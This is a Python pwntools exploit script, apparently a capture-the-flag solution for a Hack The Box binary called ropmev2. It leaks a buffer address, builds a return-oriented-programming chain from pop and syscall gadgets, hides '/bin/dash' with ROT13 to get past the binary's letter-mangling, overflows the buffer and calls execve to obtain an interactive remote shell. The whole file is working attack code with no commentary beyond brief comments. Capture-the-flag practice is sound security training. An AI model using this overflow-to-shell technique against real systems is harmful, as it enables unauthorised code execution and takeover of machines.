from pwn import *

ip = 'docker.hackthebox.eu'
port = 31371 # change this
filename = './ropmev2'

def pwn():
    r = remote(ip, port)
    #r = process(filename)
    elf = ELF(filename)
    rop = ROP(elf)

    # Find the necessary gadgets #
    rdi = p64(rop.find_gadget(['pop rdi'])[0])
    rsi = p64(rop.find_gadget(['pop rsi'])[0])
    rax = p64(rop.find_gadget(['pop rax'])[0])
    rdx = p64(rop.find_gadget(['pop rdx'])[0])
    syscall = p64(rop.find_gadget(['syscall'])[0])

    # Leak the address of buf #
    payload = 'DEBUG'
    r.sendlineafter('hack me', payload)
    r.recvuntil('this is')
    leaked = r.recvline().strip()
    leaked = int(leaked, 16)
    r.recvuntil('hack me')

    # Calculate buffer's offset #
    off = 224
    leaked -= off
    leaked = p64(leaked)

    # Craft payload syscall(execve('/bin/dash')) #
    sh = '/ova/qnfu\x00' # /bin/dash cause there is a func that changes the letters of buf.
    payload = sh + 'a'*(216 -len(sh)) + rax + p64(0x3b)
    payload += rdi + leaked + rsi + p64(0x00) + p64(0x00)
    payload += rdx + p64(0x00) + p64(0x00) + syscall
    r.sendline(payload)
    r.interactive()

pwn()
